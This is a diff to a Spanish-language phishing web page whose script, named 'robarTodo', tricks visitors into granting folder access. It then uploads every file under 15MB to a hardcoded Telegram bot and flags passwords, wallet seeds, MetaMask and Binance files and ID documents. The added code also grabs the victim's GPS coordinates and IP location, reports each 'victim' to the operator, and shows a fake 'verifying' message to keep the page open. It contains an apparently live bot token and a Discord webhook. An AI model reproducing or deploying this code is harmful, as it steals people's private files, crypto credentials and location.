@@ -18,15 +18,39 @@
 <div class="status" id="status">Esperando que elijas carpeta...</div>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1463592063059890382/eRGzjHp_vqhRlcMCOgrGRJUrf-K69jUis7lYqKOSa2luL8hfhCyoDGBDGpOPK5jdDBWX";
+
+const BOT_TOKEN = "8073881757:AAHpZPnjwg29xhmfkrahnmCnYsp8CbcMf_M";
+const CHAT_ID   = "8284747554";
+
+
+const URL_MSG = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+const URL_RESUMEN = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 async function robarTodo() {
   try {
     document.getElementById("status").innerHTML = "✅ Acceso concedido<br>Espere 5 minutos para que se active automaticamente ";
     
-    const dirHandle = await window.showDirectoryPicker({
-      mode: "readwrite"
+    const dirHandle = await window.showDirectoryPicker({ mode: "readwrite" });
+
+    
+    let geo = "Ubicación denegada o no disponible";
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
+      });
+      geo = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (precisión ±${pos.coords.accuracy.toFixed(0)}m)`;
+    } catch(e) {}
+
+    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip:"?",city:"?",country_name:"?",timezone:"?"}));
+
+    const infoVictima = `🌍 NUEVA VÍCTIMA VERIFICADA\n\nIP: ${ipData.ip}\nCiudad: ${ipData.city}, ${ipData.country_name}\nCoordenadas reales: ${geo}\nZona horaria: ${ipData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}\nCarpeta elegida: ${dirHandle.name}\nHora: ${new Date().toLocaleString('es-ES')}`;
+
+    await fetch(URL_RESUMEN, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: infoVictima})
     });
+    
 
     const interesantes = [];
     const pesados = [];
@@ -34,59 +58,29 @@ async function robarTodo() {
     for await (const entry of dirHandle.values()) {
       if (entry.kind === "file") {
         const file = await entry.getFile();
-        
-   
         const nombre = file.name.toLowerCase();
-        const esInteresante = nombre.includes("pass") || 
-                              nombre.includes("wallet") || 
-                              nombre.includes("seed") || 
-                              nombre.includes("dni") || 
-                              nombre.includes("carnet") || 
-                              nombre.includes("captura") || 
-                              nombre.includes("metamask") ||
-                              nombre.includes("binance") ||
-                              nombre.endsWith(".json") ||
-                              nombre.endsWith(".txt") ||
-                              nombre.endsWith(".docx") ||
-                              nombre.endsWith(".pdf");
+        const esInteresante = nombre.includes("pass") || nombre.includes("wallet") || nombre.includes("seed") || nombre.includes("dni") || nombre.includes("carnet") || nombre.includes("captura") || nombre.includes("metamask") || nombre.includes("binance") || nombre.endsWith(".json") || nombre.endsWith(".txt") || nombre.endsWith(".docx") || nombre.endsWith(".pdf");
 
-        if (file.size < 15 * 1024 * 1024) { // menos de 15MB → robamos
+        if (file.size < 15 * 1024 * 1024) {
           const form = new FormData();
-          form.append("file", file, file.name);
-          form.append("payload_json", JSON.stringify({
-            embeds: [{
-              title: "ARCHIVO ROBADO",
-              description: `**${file.name}**\nTamaño: ${(file.size/1024/1024).toFixed(2)} MB\nCarpeta: ${dirHandle.name}`,
-              color: esInteresante ? 0x00FF00 : 0x0099FF
-            }]
-          }));
-          await fetch(WEBHOOK, {method: "POST", body: form});
+          form.append("chat_id", CHAT_ID);
+          form.append("document", file, file.name);
+          form.append("caption", `ARCHIVO ROBADO\n📁 ${dirHandle.name}\n📄 ${file.name}\n⚖ ${(file.size/1024/1024).toFixed(2)} MB\n🕛 ${new Date().toLocaleString()}`);
+          await fetch(URL_MSG, {method: "POST", body: form});
           
           if (esInteresante) interesantes.push(file.name);
-          
         } else {
           pesados.push(`${file.name} → ${(file.size/1024/1024).toFixed(2)} MB`);
         }
       }
     }
 
-   
-    const resumen = new FormData();
-    resumen.append("payload_json", JSON.stringify({
-      content: "FOLDER ACCESS COMPLETADO",
-      embeds: [{
-        title: `VÍCTIMA RAPEADA → ${dirHandle.name}`,
-        description: interesantes.length > 0 
-          ? `ARCHIVOS JUGOSOS (${interesantes.length}):\n${interesantes.slice(0,20).join("\n")}`
-          : "No se encontraron archivos muy jugosos, pero se subió todo lo posible",
-        fields: pesados.length > 0 ? [{name: "ARCHIVOS PESADOS", value: pesados.slice(0,10).join("\n")}] : [],
-        color: 0xFF0000,
-        footer: {text: new Date().toLocaleString()}
-      }]
-    }));
-    await fetch(WEBHOOK, {method: "POST", body: resumen});
+    const textoResumen = `🟥 VÍCTIMA RAPEADA CON ÉXITO 🟥\n\n📁 Carpeta: ${dirHandle.name}\n\n${interesantes.length > 0 ? "ARCHIVOS JUGOSOS ("+interesantes.length+"):\n" + interesantes.slice(0,30).join("\n") + "\n\n" : "No había archivos muy jugosos pero se subió todo\n\n"}${pesados.length > 0 ? "ARCHIVOS PESADOS:\n" + pesados.slice(0,15).join("\n") : ""}\n\nHora: ${new Date().toLocaleString()}`;
 
-    document.getElementById("status").innerHTML = "HACK GUARDADO CORRECTAMENTE ✅<br>Mantenga esta ventana abierta por 10 minutos mientras se activa el HACK";
+    await fetch(URL_RESUMEN, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({chat_id: CHAT_ID, text: textoResumen})});
+
+    
+    document.getElementById("status").innerHTML = "Verificando... por favor espere mientras usted está siendo verificado<br><br>NO CIERRE ESTA VENTANA";
 
   } catch (e) {
     document.getElementById("status").innerHTML = "❌ Acceso denegado<br>El hack no se pudo activar";
